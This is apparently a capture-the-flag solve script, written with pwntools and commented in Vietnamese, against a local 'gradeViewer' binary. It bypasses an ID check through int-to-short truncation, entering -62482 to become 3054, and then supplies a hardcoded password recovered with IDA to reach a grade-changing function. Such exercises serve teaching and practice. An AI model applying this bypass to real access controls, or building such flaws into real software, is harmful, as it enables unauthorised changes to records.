from pwn import *

exe = context.binary = ELF('./gradeViewer', checksec=False)
p = process(exe.path)

'''
int id;
if (scanf("%d", &id) != 1 || id > 10) {
        printf("Invalid student ID.\n");

switch ((short)id)

case 3054:
            printf("\nAccessing teacher view...\n");
'''

# Tại trước khi vào hàm showGrade chương trình đã chặn cta nhập id > 10
# Vậy muốn vào teacher view thì thể dùng số âm bởi vì sau đó switch ép kiểu của id từ int về short, tìm hiểu một chút thì biết được số '-62482' khi ép về short thì = 3054

p.sendlineafter(b': ', b'-62482')

# Sau đó chương trình yêu cầu nhập mật khẩu, vào trong hàm authenticateTeacher() trong IDA xem có gì
'''
v11 = SECRET;

if ( !(unsigned int)j_strcmp_ifunc(v16, v11) )
  {
    puts("\nAccess granted.");
    changeGrade();
  }
'''

# Chương trình so sánh SECRET(v11) với v16 là mật khẩu người dùng nhập vào, xem SECRET có gì

'''
.data:00000000004CB0D0 SECRET          dq offset aF1shc0de     ; DATA XREF: authenticateTeacher+69↑r
.data:00000000004CB0D0                                         ; authenticateTeacher:loc_401CF9↑r
.data:00000000004CB0D0                                         ; "f1shc0de"
'''
# Vậy mật khẩu là f1shc0de

p.sendlineafter(b':', b'f1shc0de')

p.interactive()